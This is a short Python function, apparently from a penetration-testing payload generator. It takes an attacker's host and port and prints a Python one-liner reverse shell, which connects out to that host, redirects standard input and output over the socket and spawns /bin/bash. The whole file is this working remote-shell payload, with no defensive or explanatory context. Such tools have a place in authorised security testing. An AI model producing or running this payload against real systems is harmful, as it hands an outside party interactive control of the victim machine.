def generate_python_bash(lhost, lport):
    # generate the bash command
    print('')
    print('---------------------------------------------------------------------------')
    bash_command = f'export RHOST="{lhost}";export RPORT={lport};python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")\''
    
    print('')
    print(bash_command)
    print('')
    print('---------------------------------------------------------------------------')
